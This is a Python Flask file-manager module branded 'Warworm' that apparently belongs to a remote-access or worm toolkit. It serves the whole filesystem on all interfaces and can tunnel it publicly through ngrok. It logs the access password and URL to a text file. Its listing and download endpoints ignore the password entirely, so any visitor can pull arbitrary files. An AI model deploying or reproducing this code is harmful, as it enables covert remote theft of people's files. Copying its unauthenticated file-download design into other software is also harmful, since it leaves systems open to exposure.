#!/usr/bin/env python3
"""
RMM: File Manager Module help get Download, Preview and more
"""

import os
import sys
import json
import shutil
import base64
import random
import threading
import string
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_file, abort

try:
    from pyngrok import ngrok
    PYNGROK_AVAILABLE = True
except ImportError:
    PYNGROK_AVAILABLE = False

app = Flask(__name__)
app.secret_key = 'warworm_fm_' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))


ngrok_url = None
server_port = 5001
access_password = ""

# HTML Template (embedded)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager | Warworm</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: #0a0a0f; color: #fff; height: 100vh; overflow: hidden; }
        #loginScreen { position: fixed; inset: 0; display: flex; justify-content: center; align-items: center; background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0f 100%); z-index: 1000; }
        .login-box { background: rgba(30,30,40,0.95); border: 1px solid rgba(0,212,255,0.3); border-radius: 20px; padding: 40px; width: 90%; max-width: 400px; text-align: center; }
        h1 { color: #00d4ff; margin-bottom: 20px; }
        input[type="password"] { width: 100%; padding: 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 20px; }
        button { padding: 16px 24px; background: linear-gradient(135deg, #00d4ff, #7b2cbf); border: none; border-radius: 12px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
        #mainInterface { display: none; height: 100vh; display: flex; flex-direction: column; }
        .header { background: rgba(30,30,40,0.95); padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; }
        .file-list { flex: 1; overflow-y: auto; padding: 20px; }
        .file-item { display: flex; align-items: center; padding: 12px; background: rgba(255,255,255,0.03); border-radius: 8px; margin-bottom: 8px; cursor: pointer; transition: all 0.2s; }
        .file-item:hover { background: rgba(0,212,255,0.1); }
        .file-icon { width: 40px; height: 40px; background: rgba(0,212,255,0.2); border-radius: 8px; display: flex; align-items: center; justify-content: center; margin-right: 12px; }
        .toolbar { display: flex; gap: 10px; }
        .btn { padding: 8px 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; color: #fff; cursor: pointer; font-size: 14px; }
        .btn:hover { background: rgba(0,212,255,0.2); }
    </style>
</head>
<body>
    <div id="loginScreen">
        <div class="login-box">
            <h1>📁 File Manager</h1>
            <input type="password" id="passwordInput" placeholder="Enter password...">
            <button onclick="doLogin()">Access</button>
            <div id="errorMsg" style="color: #ff3366; margin-top: 12px; display: none;">Access Denied</div>
        </div>
    </div>

    <div id="mainInterface" style="display: none;">
        <div class="header">
            <h2 id="currentPath">C:\\</h2>
            <div class="toolbar">
                <button onclick="goUp()">⬆ Up</button>
                <button onclick="refresh()">🔄 Refresh</button>
            </div>
        </div>
        <div class="file-list" id="fileList"></div>
    </div>

    <script>
        var currentPath = 'C:\\\\';
        
        function doLogin() {
            fetch('/auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: document.getElementById('passwordInput').value})
            })
            .then(r => r.json())
            .then(data => {
                if(data.success) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('mainInterface').style.display = 'flex';
                    loadDirectory(currentPath);
                } else {
                    document.getElementById('errorMsg').style.display = 'block';
                }
            });
        }
        
        function loadDirectory(path) {
            fetch('/api/list?path=' + encodeURIComponent(path))
            .then(r => r.json())
            .then(data => {
                currentPath = path;
                document.getElementById('currentPath').textContent = path;
                const list = document.getElementById('fileList');
                list.innerHTML = '';
                
                if(data.files) {
                    data.files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'file-item';
                        div.innerHTML = '<div class="file-icon">' + (file.type === 'directory' ? '📁' : '📄') + '</div><div>' + file.name + '</div>';
                        div.onclick = () => {
                            if(file.type === 'directory') {
                                loadDirectory(path + '\\\\' + file.name);
                            }
                        };
                        list.appendChild(div);
                    });
                }
            });
        }
        
        function goUp() {
            const parts = currentPath.split('\\\\');
            if(parts.length > 1) {
                parts.pop();
                loadDirectory(parts.join('\\\\') || 'C:\\\\');
            }
        }
        
        function refresh() { loadDirectory(currentPath); }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    if data and data.get('password') == access_password:
        return jsonify({'success': True})
    return jsonify({'success': False}), 403

@app.route('/api/list')
def list_dir():
    path = request.args.get('path', 'C:\\')
    try:
        target = Path(path).resolve()
        if not target.exists():
            return jsonify({'error': 'Path not found'}), 404
        files = []
        for item in sorted(target.iterdir()):
            try:
                stat = item.stat()
                files.append({
                    'name': item.name,
                    'type': 'directory' if item.is_dir() else 'file',
                    'size': stat.st_size,
                    'modified': stat.st_mtime * 1000
                })
            except (PermissionError, OSError):
                continue
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/download')
def download():
    path = request.args.get('path', '')
    try:
        target = Path(path).resolve()
        if not target.exists() or not target.is_file():
            abort(404)
        return send_file(str(target), as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

class FileManager:
    def __init__(self, config=None, output_dir=None):
        self.config = config or {}
        self.output_dir = output_dir or os.path.expanduser("~")
        self.port = random.randint(49000, 65000)
        self.password = self._generate_password()
        self.ngrok_token = self.config.get('ngrok_token', '')
        self.public_url = None
        self.thread = None
        
    def _generate_password(self):
        if self.config.get('filemanager_password'):
            return self.config['filemanager_password']
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    
    def _save_credentials(self):
        #Saved remote_login.txt 
        creds_file = os.path.join(self.output_dir, "remote_login.txt")
        try:
            with open(creds_file, 'a', encoding='utf-8') as f:
                f.write("\n" + "=" * 70 + "\n")
                f.write("               WARWORM FILE MANAGER - ACCESS CREDENTIALS\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Service: File Manager\n")
                f.write(f"Local URL: http://localhost:{self.port}\n")
                if self.public_url:
                    f.write(f"Public URL (Ngrok): {self.public_url}\n")
                f.write(f"Password: {self.password}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"    [+] File Manager credentials saved: {creds_file}")
            return True
        except Exception as e:
            print(f"    [!] Failed to save credentials: {e}")
            return False
    
    def _start_ngrok(self):
        global ngrok_url
        if not PYNGROK_AVAILABLE or not self.ngrok_token:
            return None
        
        try:
            print(f"    [*] Starting File Manager Ngrok tunnel...")
            ngrok.set_auth_token(self.ngrok_token)
            self.public_url = ngrok.connect(self.port, "http").public_url
            ngrok_url = self.public_url
            print(f"    [+] File Manager Ngrok URL: {self.public_url}")
            return self.public_url
        except Exception as e:
            print(f"    [!] Ngrok failed: {e}")
            return None
    
    def start(self):
        global access_password, server_port
        
        print("[*] Starting File Manager module...")
        
        access_password = self.password
        server_port = self.port
        
        # Save credentials
        self._save_credentials()
        
        # Start ngrok if configured
        if self.ngrok_token:
            self._start_ngrok()
            self._save_credentials()
        
        def run_server():
            try:
                app.run(host='0.0.0.0', port=self.port, threaded=True, debug=False, use_reloader=False)
            except Exception as e:
                print(f"[FM] Server error: {e}")
        
        self.thread = threading.Thread(target=run_server, daemon=True)
        self.thread.start()
        
        print(f"    [+] File Manager started on port {self.port}")
        print(f"    [+] Password: {self.password}")
        if self.public_url:
            print(f"    [+] Public Access: {self.public_url}")
            
        return {
            'port': self.port,
            'password': self.password,
            'ngrok_url': self.public_url,
            'local_url': f"http://localhost:{self.port}"
        }
    
    def stop(self):
        if PYNGROK_AVAILABLE and self.public_url:
            try:
                ngrok.disconnect(self.public_url)
            except:
                pass
        print("[*] File Manager stopped")

def start_filemanager(config, output_dir):
    fm = FileManager(config, output_dir)
    return fm.start()